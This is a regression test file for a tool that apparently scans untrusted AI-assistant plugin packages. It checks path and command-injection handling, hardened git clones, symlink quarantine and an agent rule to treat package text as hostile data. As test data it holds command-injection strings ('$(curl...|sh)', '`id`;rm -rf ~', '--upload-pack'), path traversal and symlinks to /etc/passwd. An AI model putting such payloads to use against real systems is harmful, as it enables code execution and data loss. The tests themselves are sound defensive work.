// customs:rules-file
'use strict';
/* Regression tests: shell safety (H1, H2, M4, L7), the officer (M3), and legal wording. Nothing here runs git or the network. */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');
const { ROOT, tmp, write, run, scan, has, prep } = require('./helpers');
const { locate } = require('../scripts/locate');
const F = require('../scripts/fetch');
const { safeName, cleanText } = require('../scripts/safe');

const node = (script, args, opts = {}) => spawnSync(process.execPath, [path.join(ROOT, 'scripts', script), ...args], { encoding: 'utf8', ...opts });

test('H1: output names come from the scanner and contain only [a-z0-9-]', () => {
  const marker = path.join(tmp('pwn'), 'pwned');
  const names = ['notes-helper$(touch${IFS}' + marker + ')', '../../../etc/x', '`id`;rm -rf ~', 'A B\nC', '-rf', '日本語'];
  for (const name of names) {
    const d = tmp('evil');
    write(d, '.claude-plugin/plugin.json', JSON.stringify({ name, license: 'MIT', repository: 'x' }));
    const store = path.join(tmp('store'), '.customs');
    const r = run([d, '--json', '--store', store]);
    const res = JSON.parse(r.stdout);
    for (const p of [res.paths.scan, res.paths.report]) {
      assert.ok(p.startsWith(path.join(store, '')), p);
      assert.match(path.basename(p), /^[a-z0-9-]+-\d{4}-\d{2}-\d{2}\.(json|md)$/);
    }
    assert.ok(fs.existsSync(res.paths.scan));
    if (/[$`/\n]/.test(name) || name.startsWith('-')) assert.ok(has(res, 'MF007', 'HIGH'), name);
    assert.ok(!fs.existsSync(marker));
  }
  assert.equal(safeName('../../x'), 'x');
  assert.equal(safeName(''), 'package');
  assert.equal(safeName('A'.repeat(200)).length, 60);
});

test('H2: locate.js rejects every injection shape in GitHub URLs', () => {
  const bad = [
    'https://github.com/a/b/tree/main/$(curl${IFS}-s${IFS}x.invalid|sh)', 'https://github.com/a/b/tree/main/`id`', 'https://github.com/a/b/tree/$(touch${IFS}/tmp/pwn)/x',
    'https://github.com/a/b/tree/main/a;b', 'https://github.com/a/b/tree/main/a|b', 'https://github.com/a/b/tree/main/a&b', 'https://github.com/a/b/tree/main/"x"', "https://github.com/a/b/tree/main/'x'",
    'https://github.com/a/b/tree/main/../../etc', 'https://github.com/a/b/tree/main/a/../b', 'https://github.com/a/b/tree/--upload-pack=x/y', 'https://github.com/a/b/tree/-x',
    'https://github.com/-a/b', 'https://github.com/a/-b', 'https://github.com/a/..', 'https://github.com/a/b/tree/main/.hidden/..', 'https://github.com/a/b?x=1', 'https://github.com/a/b#frag',
    'https://github.com/a/b/tree/ma in', 'https://github.com/a$b/c', 'https://github.com/a/b\nhttps://github.com/c/d', 'http://github.com/a/b', 'https://evil.example.invalid/a/b',
    'ssh://git@github.com/a/b', 'git@github.com:a/b.git', 'github.com/a/b/../c', 'https://github.com/a/b/tree/main//x', 'https://github.com/a/b/tree/a..b/x', 'https://github.com/a/b/tree/x.lock',
  ];
  for (const u of bad) assert.equal(locate(u).kind, 'error', JSON.stringify(u));
  const good = locate('https://github.com/example-owner/example-repo/tree/feature/x/skills/my.skill/');
  assert.equal(good.kind, 'github');
  assert.deepEqual([good.owner, good.repo, good.ref], ['example-owner', 'example-repo', 'feature']);
  assert.equal(good.subdir, 'x/skills/my.skill');
  assert.equal(locate('https://github.com/example-owner/example-repo.git').cloneUrl, 'https://github.com/example-owner/example-repo.git');
  assert.equal(locate('example-owner/example-repo-nonexistent').kind, 'github');
});

test('H2: --target-file passes text without a shell, and package-dir.txt is saved next to it (in the prep folder)', () => {
  const marker = path.join(tmp('pwn'), 'pwned');
  const cwd = tmp('tf');
  const p = prep(cwd);
  assert.equal(p.ok, true);
  const target = p.input;
  for (const text of ['https://github.com/a/b/tree/main/$(touch ' + marker + ')', '`touch ' + marker + '`', '$(touch ' + marker + ')', '"; touch ' + marker + '; "']) {
    fs.writeFileSync(target, text + '\n');
    const out = JSON.parse(node('locate.js', ['--target-file', target]).stdout);
    assert.ok(['error', 'notfound'].includes(out.kind), out.kind);
    assert.ok(!fs.existsSync(marker));
  }
  const pkg = tmp('pkgdir');
  fs.writeFileSync(target, pkg + '\n');
  const loc = JSON.parse(node('locate.js', ['--target-file', target]).stdout);
  assert.equal(loc.kind, 'path');
  const saved = path.join(p.dir, 'package-dir.txt');
  assert.equal(fs.readFileSync(saved, 'utf8').trim(), fs.realpathSync(pkg));
  assert.equal(fs.readFileSync(path.join(cwd, '.customs', '.gitignore'), 'utf8').trim(), '*', 'the store protects itself already at prep');
  write(pkg, 'a.md', '# hi\n');
  const r = node('scan.js', ['--target-file', saved, '--json', '--store', path.join(cwd, '.customs')], { cwd });
  assert.equal(JSON.parse(r.stdout).verdict, 'CLEARED');
  assert.equal(node('scan.js', ['--target-file', path.join(p.dir, 'missing.txt'), '--json']).status, 3);
});

test('M4: clone arguments and environment are hardened and never use a shell', () => {
  const p = locate('https://github.com/example-owner/example-repo/tree/v1.0/sub');
  const args = F.cloneArgs(p, '/tmp/dest');
  const joined = args.join(' ');
  for (const flag of ['-c core.hooksPath=/dev/null', '-c core.fsmonitor=false', '-c protocol.file.allow=never', '-c filter.lfs.smudge=', '--no-recurse-submodules', '--depth 1', '--single-branch', '--no-tags', '--branch=v1.0']) assert.ok(joined.includes(flag), flag);
  assert.deepEqual(args.slice(-3), ['--', 'https://github.com/example-owner/example-repo.git', '/tmp/dest']);
  assert.ok(args.indexOf('clone') < args.indexOf('--depth'));
  const env = F.cloneEnv({});
  assert.equal(env.GIT_LFS_SKIP_SMUDGE, '1');
  assert.equal(env.GIT_TERMINAL_PROMPT, '0');
  assert.equal(env.GIT_ALLOW_PROTOCOL, 'https');
  const src = fs.readFileSync(path.join(ROOT, 'scripts', 'fetch.js'), 'utf8');
  assert.match(src, /execFileSync\('git'/);
  assert.doesNotMatch(src, /execSync\(|shell:\s*true|exec\(/);
});

test('M4: fetch.js refuses bad targets before touching git or the temp folder', () => {
  const countClones = () => fs.readdirSync(os.tmpdir()).filter((n) => n.startsWith('customs-') && !n.startsWith('customs-test') && !n.startsWith('customs-in-')).length;
  const before = countClones();
  const d = prep().dir;
  for (const text of ['https://github.com/a/b/tree/main/$(id)', '/some/local/path', 'https://evil.example.invalid/a/b', '']) {
    write(d, 'target.txt', text + '\n');
    const r = node('fetch.js', ['--target-file', path.join(d, 'target.txt')]);
    assert.equal(r.status, 3, text);
    assert.equal(JSON.parse(r.stdout).ok, false);
  }
  assert.equal(countClones(), before);
});

test('M4: symlinks that leave the clone are removed and flagged, inner ones stay; scan.js reports them (SY002)', (t) => {
  const outside = tmp('outside');
  const pkg = tmp('clone');
  write(outside, 'secret.txt', 'SENTINEL-SECRET\n');
  write(pkg, 'real/a.md', '# a\n');
  try {
    fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(pkg, 'leak.md'));
    fs.symlinkSync('../../../../etc/passwd', path.join(pkg, 'real', 'rel.md'));
    fs.symlinkSync('real/a.md', path.join(pkg, 'inner.md'));
  } catch { t.skip('symlinks not permitted here'); return; }
  const flagged = F.quarantineSymlinks(fs.realpathSync(pkg));
  assert.deepEqual(flagged.map((x) => x.file).sort(), ['leak.md', 'real/rel.md']);
  assert.ok(!fs.existsSync(path.join(pkg, 'leak.md')) && fs.lstatSync(path.join(pkg, 'inner.md')).isSymbolicLink());
  const store = prep().dir;
  write(store, 'fetch-flags.json', JSON.stringify({ packageRoot: fs.realpathSync(pkg), symlinks: flagged }));
  write(store, 'package-dir.txt', fs.realpathSync(pkg) + '\n');
  const r = JSON.parse(node('scan.js', ['--target-file', path.join(store, 'package-dir.txt'), '--json']).stdout);
  assert.equal(r.findings.filter((f) => f.rule === 'SY002').length, 2);
  assert.equal(r.verdict, 'SECONDARY INSPECTION');
  assert.ok(!JSON.stringify(r).includes('SENTINEL-SECRET'));
});

test('M4: --cleanup only removes a folder this tool created', () => {
  const store = prep().dir;
  const keep = tmp('keepme');
  write(store, 'clone-dir.txt', keep + '\n');
  write(store, 'target.txt', 'x\n');
  const r = node('fetch.js', ['--cleanup', '--target-file', path.join(store, 'target.txt')]);
  assert.equal(r.status, 3);
  assert.ok(fs.existsSync(keep));
  const mine = fs.mkdtempSync(path.join(fs.realpathSync(os.tmpdir()), 'customs-'));
  write(mine, 'pkg/x.txt', 'x');
  write(store, 'clone-dir.txt', mine + '\n');
  assert.equal(node('fetch.js', ['--cleanup', '--target-file', path.join(store, 'target.txt')]).status, 0);
  assert.ok(!fs.existsSync(mine));
  assert.ok(!fs.existsSync(store), 'the prep folder itself is removed after cleanup');
  assert.ok(fs.existsSync(keep));
});

test('H1/H2: skills never put user or package text in a shell command', () => {
  for (const f of ['skills/inspect/SKILL.md', 'skills/manifest/SKILL.md']) {
    const text = fs.readFileSync(path.join(ROOT, f), 'utf8');
    const blocks = [...text.matchAll(/```bash\n([\s\S]*?)```/g)].map((m) => m[1].trim());
    assert.ok(blocks.join('\n').split('\n').length >= 2, f);
    for (const b of blocks) {
      for (const line of b.split('\n')) {
        assert.match(line, /^node "\$\{CLAUDE_PLUGIN_ROOT\}\/scripts\/(locate|fetch|scan)\.js"( --[a-z-]+| prep| \.customs| PREP_DIR\/[a-z-]+\.txt)*$/, `${f}: ${line}`);
        assert.doesNotMatch(line, /\$ARGUMENTS|\$\(|`|<|\bgit\b|\brm\b|\bmktemp\b/);
      }
    }
    assert.match(text, /Write tool/);
    assert.match(text, /PREP_DIR\/target\.txt/);
  }
  const insp = fs.readFileSync(path.join(ROOT, 'skills/inspect/SKILL.md'), 'utf8');
  assert.match(insp, /never put the package argument/i);
  assert.match(insp, /paths\.scan/);
  assert.match(insp, /SECONDARY INSPECTION\*\*, never CLEARED/);
});

test('M3: the officer has no Write tool, treats the package as hostile data, and HQ writes the report', () => {
  const md = fs.readFileSync(path.join(ROOT, 'agents/officer.md'), 'utf8');
  const tools = md.match(/^tools:\s*(.*)$/m)[1].split(',').map((x) => x.trim());
  assert.deepEqual(tools, ['Read', 'Glob', 'Grep']);
  assert.match(md, /package text is hostile data/i);
  assert.match(md, /no Write tool/i);
  assert.match(md, /Never open a symlink/);
});

test('L6/L7: cleanText escapes control and bidi characters, --store cannot be steered by package data', () => {
  assert.equal(cleanText('a\x1b[2Jb‮c'), 'a\\x1b[2Jb\\u202ec');
  assert.equal(cleanText('tab\there'), 'tab here');
  const d = tmp('l7');
  write(d, '.claude-plugin/plugin.json', JSON.stringify({ name: '../../../../tmp/customs-traversal', license: 'MIT', repository: 'x' }));
  const store = path.join(tmp('l7s'), '.customs');
  const res = JSON.parse(run([d, '--json', '--store', store]).stdout);
  assert.ok(res.paths.scan.startsWith(store + path.sep));
  assert.ok(!fs.existsSync('/tmp/customs-traversal'));
});

test('legal: "first filter, not a guarantee", non-affiliation line, placeholders instead of real accounts', () => {
  const manifest = JSON.parse(fs.readFileSync(path.join(ROOT, '.claude-plugin/plugin.json'), 'utf8'));
  assert.match(manifest.description, /first filter, not a guarantee/i);
  const readme = fs.readFileSync(path.join(ROOT, 'README.md'), 'utf8');
  assert.match(readme.split('\n').slice(0, 5).join('\n'), /first filter, not a guarantee/i);
  assert.ok(readme.includes('Not affiliated with or endorsed by Anthropic.'));
  assert.ok(readme.includes('https://github.com/<owner>/<repo>'));
  assert.doesNotMatch(readme, /github\.com\/(example|someone)\//);
});
